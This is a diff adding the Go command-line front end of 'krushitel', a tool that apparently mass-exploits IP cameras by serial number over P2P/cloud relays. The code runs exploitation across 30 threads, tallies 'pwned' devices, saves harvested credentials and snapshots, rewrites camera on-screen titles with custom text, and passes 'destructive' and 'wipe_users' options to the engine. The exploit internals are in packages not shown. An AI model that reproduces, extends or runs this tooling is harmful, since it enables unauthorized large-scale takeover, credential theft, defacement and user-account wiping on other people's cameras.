@@ -1,0 +1,419 @@
+package main
+
+// headless — CLI-режим без TUI:
+//
+//	krushitel -i serials.txt -m exploit -o papkabebra1337 -t 30
+//	krushitel -i results.txt -m titles
+//
+// stdout — минималистичный формат (баннер, started, saving, прогресс,
+// [!] err для ошибок СОФТА, finished). Весь сетевой шум и per-serial
+// события — только в log.txt рядом с результатами. config.json тот же,
+// результаты те же (results/done/nostun, session-маркер для resume).
+// Ctrl+C = esc в TUI: session-маркер остаётся, следующий запуск продолжит.
+
+import (
+	"context"
+	"encoding/json"
+	"flag"
+	"fmt"
+	"os"
+	"os/signal"
+	"path/filepath"
+	"strings"
+	"sync"
+	"time"
+
+	"krushitel/cloud"
+	"krushitel/dhip"
+	"krushitel/exploit"
+	"krushitel/fwd"
+	"krushitel/ironscan"
+	"krushitel/ui"
+	"krushitel/update"
+)
+
+var (
+	logMu   sync.Mutex
+	logFile *os.File
+	start   time.Time
+)
+
+// flog — файловый лог (сетевой шум, per-serial события). stdout не трогает.
+func flog(format string, args ...any) {
+	logMu.Lock()
+	defer logMu.Unlock()
+	if logFile != nil {
+		fmt.Fprintf(logFile, "[%s] ", time.Now().Format("15:04:05"))
+		fmt.Fprintf(logFile, format+"\n", args...)
+	}
+}
+
+// out — строка в stdout И в файл (баннер, started, err — то, что юзер читает).
+func out(format string, args ...any) {
+	logMu.Lock()
+	defer logMu.Unlock()
+	fmt.Printf(format+"\n", args...)
+	if logFile != nil {
+		fmt.Fprintf(logFile, format+"\n", args...)
+	}
+}
+
+// isTTY — рисовать прогресс поверх строки (\r) или печатать периодически.
+func isTTY() bool {
+	fi, err := os.Stdout.Stat()
+	return err == nil && fi.Mode()&os.ModeCharDevice != 0
+}
+
+// elapsed — сколько идёт прогон: MM:SS, после часа — H:MM:SS (это не ETA,
+// никакой предсказательной хуйни — просто время в работе).
+func elapsed() string {
+	d := time.Since(start).Truncate(time.Second)
+	h := int(d.Hours())
+	m := int(d.Minutes()) % 60
+	s := int(d.Seconds()) % 60
+	if h > 0 {
+		return fmt.Sprintf("%d:%02d:%02d", h, m, s)
+	}
+	return fmt.Sprintf("%02d:%02d", m, s)
+}
+
+func headlessUsage() {
+	fmt.Print(`krushitel headless:
+  -i, --input FILE     входной файл (exploit: серийники; titles: results.txt)
+  -m, --mode MODE      exploit (по умолчанию) | titles
+  -o, --output DIR     папка результатов (по умолчанию — имя входного файла)
+  -t, --threads N      потоки (по умолчанию 30)
+  -f, --fresh          игнорировать session-маркер и done.txt (прогон заново)
+Бой — config.json (snaps/xml/preflight/destructive/wipe_users/dummy).
+Ctrl+C — мягкая остановка: session-маркер остаётся, следующий запуск продолжит.
+`)
+}
+
+// runHeadless — true: вызов обработан CLI-режимом; false: обычный TUI-старт.
+// Headless — ЛЮБОЙ запуск с флагом (голый `krushitel` = TUI).
+func runHeadless() bool {
+	help := false
+	headless := false
+	for _, a := range os.Args[1:] {
+		if strings.HasPrefix(a, "-") {
+			headless = true
+		}
+		if a == "-h" || a == "--help" || a == "help" {
+			help = true
+		}
+	}
+	if help {
+		headlessUsage()
+		return true
+	}
+	if !headless {
+		return false
+	}
+
+	fs := flag.NewFlagSet("krushitel", flag.ContinueOnError)
+	inFile := fs.String("i", "", "входной файл")
+	fs.StringVar(inFile, "input", "", "алиас -i")
+	mode := fs.String("m", "exploit", "режим: exploit | titles")
+	fs.StringVar(mode, "mode", "exploit", "алиас -m")
+	outDir := fs.String("o", "", "папка результатов")
+	fs.StringVar(outDir, "output", "", "алиас -o")
+	threads := fs.Int("t", 30, "потоки")
+	fs.IntVar(threads, "threads", 30, "алиас -t")
+	fresh := fs.Bool("f", false, "прогон заново, без resume")
+	fs.BoolVar(fresh, "fresh", false, "алиас -f")
+	if err := fs.Parse(os.Args[1:]); err != nil {
+		headlessUsage()
+		os.Exit(2)
+	}
+	if *inFile == "" {
+		out("[!] err: нужен -i/--input (файл серийников или results.txt для titles)")
+		os.Exit(2)
+	}
+	if *mode != "exploit" && *mode != "titles" {
+		out("[!] err: неизвестный режим %q — доступен exploit | titles", *mode)
+		os.Exit(2)
+	}
+
+	ui.LoadSettings()
+	cfg := ui.Config()
+	start = time.Now()
+
+	tty := isTTY()
+	var lineLen int
+
+	// render — строка прогресса поверх строки; в пайпе — раз в 30с полной строкой.
+	render := func(done, total int64, hits string) {
+		line := fmt.Sprintf("%d/%d | %s | %s", done, total, hits, elapsed())
+		logMu.Lock()
+		defer logMu.Unlock()
+		if tty {
+			if len(line) < lineLen {
+				line += strings.Repeat(" ", lineLen-len(line))
+			}
+			lineLen = len(line)
+			fmt.Printf("\r%s", line)
+		} else {
+			fmt.Println(line)
+			if logFile != nil {
+				fmt.Fprintln(logFile, line)
+			}
+		}
+	}
+	renderDone := func(done, total int64, hits string) {
+		logMu.Lock()
+		defer logMu.Unlock()
+		if tty {
+			final := fmt.Sprintf("%d/%d | %s | %s", done, total, hits, elapsed())
+			if len(final) < lineLen {
+				final += strings.Repeat(" ", lineLen-len(final))
+			}
+			fmt.Printf("\r%s\n", final)
+			lineLen = 0
+			if logFile != nil {
+				fmt.Fprintln(logFile, final)
+			}
+		}
+	}
+
+	switch *mode {
+	case "exploit":
+		os.Exit(runHeadlessExploit(cfg, *inFile, *outDir, *threads, *fresh, render, renderDone))
+	case "titles":
+		os.Exit(runHeadlessTitles(cfg, *inFile, *threads, render, renderDone))
+	}
+	return true
+}
+
+// headlessLogOpen — log.txt рядом с результатами (append между прогонами).
+func headlessLogOpen(path string) {
+	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		out("[!] err: лог-файл не открылся: %v", err)
+		return
+	}
+	logFile = f
+}
+
+// wireHooks — всё сетевое взаимодействие в файл (stdout не засоряем).
+func wireHooks(cfg ui.Settings) func() {
+	fwd.Debug = cfg.Debug
+	fwd.LogHook = func(line string) { flog("%s", line) }
+	cloud.LogHook = func(line string) { flog("%s", line) }
+	dhip.LogHook = func(format string, args ...any) {
+		flog("%s", fmt.Sprintf(format, args...))
+	}
+	exploit.LogHook = func(format string, args ...any) {
+		flog("%s", fmt.Sprintf(format, args...))
+	}
+	return func() {
+		fwd.LogHook = nil
+		cloud.LogHook = nil
+		dhip.LogHook = nil
+		exploit.LogHook = nil
+	}
+}
+
+// resumeFilter — повтор логики TUI: живой session-маркер + done.txt =
+// продолжаем с необработанных. Возвращает (serials, resume).
+func resumeFilter(serials []string, outDir string, fresh bool) ([]string, bool) {
+	if fresh {
+		return serials, false
+	}
+	data, err := os.ReadFile(filepath.Join(outDir, exploit.SessionFile))
+	if err != nil {
+		return serials, false
+	}
+	var sess struct {
+		InFile string `json:"in_file"`
+	}
+	if json.Unmarshal(data, &sess) != nil || sess.InFile == "" {
+		return serials, false
+	}
+	done := make(map[string]struct{})
+	if d, err := os.ReadFile(filepath.Join(outDir, exploit.DoneFile)); err == nil {
+		for _, line := range strings.Split(string(d), "\n") {
+			if s := ironscan.SanitizeSerial(line); s != "" {
+				done[s] = struct{}{}
+			}
+		}
+	}
+	if len(done) == 0 {
+		return serials, false
+	}
+	remaining := make([]string, 0, len(serials))
+	for _, s := range serials {
+		if _, ok := done[s]; !ok {
+			remaining = append(remaining, s)
+		}
+	}
+	flog("resume: прошлый прогон %q, отработано %d — продолжаем с %d", sess.InFile, len(done), len(remaining))
+	return remaining, true
+}
+
+func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fresh bool,
+	render func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
+	serials, err := exploit.LoadSerials(inFile)
+	if err != nil {
+		out("[!] err: входной файл: %v", err)
+		return 2
+	}
+	if len(serials) == 0 {
+		out("[!] err: файл пуст или серийников не нашлось")
+		return 2
+	}
+	if outDir == "" {
+		outDir = strings.TrimSuffix(filepath.Base(inFile), filepath.Ext(inFile))
+	}
+	if threads <= 0 {
+		threads = 30
+	}
+
+	_ = os.MkdirAll(outDir, 0755)
+	headlessLogOpen(filepath.Join(outDir, "log.txt"))
+	unhook := wireHooks(cfg)
+	defer unhook()
+
+	out("[%s] krushitel v%s-beta (latest)", time.Now().Format("15:04"), update.CurrentVersion)
+	out("started exploiting %d SNs", len(serials))
+	out("saving results at //%s", outDir)
+
+	remaining, resume := resumeFilter(serials, outDir, fresh)
+
+	// session-маркер: живёт до чистого завершения (движок удалит)
+	sess, _ := json.Marshal(struct {
+		InFile  string `json:"in_file"`
+		Threads int    `json:"threads"`
+		Total   int    `json:"total"`
+		Started string `json:"started"`
+	}{inFile, threads, len(remaining), time.Now().Format("02.01.2006 15:04:05")})
+	_ = os.MkdirAll(outDir, 0755)
+	_ = os.WriteFile(filepath.Join(outDir, exploit.SessionFile), sess, 0644)
+
+	// глобальный лимит одновременных P2P-init'ов — паритет с TUI
+	fwd.InitLimit = 100
+
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
+	defer stop()
+
+	stats := &exploit.Stats{}
+	events := make(chan string, 1024)
+	doneEvents := make(chan struct{})
+	go func() {
+		for line := range events {
+			flog("%s", line)
+		}
+	}()
+	go func() {
+		ticker := time.NewTicker(500 * time.Millisecond)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				render(stats.Processed, stats.Total, fmt.Sprintf("pwned: %d", stats.Pwned))
+			case <-doneEvents:
+				return
+			}
+		}
+	}()
+
+	exploit.RunExploit(ctx, remaining, outDir, threads, exploit.Opts{
+		OutDir:      outDir,
+		Snaps:       cfg.Snaps,
+		XML:         cfg.XML,
+		Titles:      cfg.Titles,
+		ChanText:    cfg.ChannelText,
+		CustomTexts: cfg.CustomTexts[:],
+		DummyLogin:  cfg.DummyLogin,
+		DummyPass:   cfg.DummyPass,
+		Preflight:   cfg.Preflight,
+		Resume:      resume,
+		Destructive: cfg.Destructive,
+		WipeUsers:   cfg.WipeUsers,
+	}, stats, events)
+
+	close(doneEvents)
+	close(events)
+	renderDone(stats.Processed, stats.Total, fmt.Sprintf("pwned: %d", stats.Pwned))
+
+	if stats.ErrorMsg != "" {
+		out("[!] err: %s", stats.ErrorMsg)
+		return 1
+	}
+	out("exploit finished")
+	if ctx.Err() != nil {
+		flog("прервано: session-маркер сохранён, следующий запуск продолжит")
+		return 130
+	}
+	return 0
+}
+
+func runHeadlessTitles(cfg ui.Settings, inFile string, threads int,
+	render func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
+	cams, skipped, err := exploit.ParseResultsCreds(inFile)
+	if err != nil {
+		out("[!] err: входной файл: %v", err)
+		return 2
+	}
+	if len(cams) == 0 {
+		out("[!] err: файл пуст или камер не нашлось")
+		return 2
+	}
+
+	logName := strings.TrimSuffix(inFile, filepath.Ext(inFile)) + "_titles.log"
+	headlessLogOpen(logName)
+	unhook := wireHooks(cfg)
+	defer unhook()
+
+	out("[%s] krushitel v%s-beta (latest)", time.Now().Format("15:04"), update.CurrentVersion)
+	out("started titling %d cams", len(cams))
+	if skipped > 0 {
+		out("skipped %d lines", skipped)
+	}
+
+	if threads <= 0 {
+		threads = 200
+	}
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
+	defer stop()
+
+	stats := &exploit.TitlesStats{}
+	events := make(chan string, 1024)
+	doneEvents := make(chan struct{})
+	go func() {
+		for line := range events {
+			flog("%s", line)
+		}
+	}()
+	go func() {
+		ticker := time.NewTicker(500 * time.Millisecond)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				render(stats.Processed, stats.Total, fmt.Sprintf("titled: %d", stats.Titled))
+			case <-doneEvents:
+				return
+			}
+		}
+	}()
+
+	exploit.RunTitles(ctx, cams, threads, exploit.Opts{
+		Titles:      true,
+		ChanText:    cfg.ChannelText,
+		CustomTexts: cfg.CustomTexts[:],
+	}, stats, events)
+
+	close(doneEvents)
+	close(events)
+	renderDone(stats.Processed, stats.Total, fmt.Sprintf("titled: %d", stats.Titled))
+
+	if stats.ErrorMsg != "" {
+		out("[!] err: %s", stats.ErrorMsg)
+		return 1
+	}
+	out("titles finished")
+	if ctx.Err() != nil {
+		return 130
+	}
+	return 0
+}
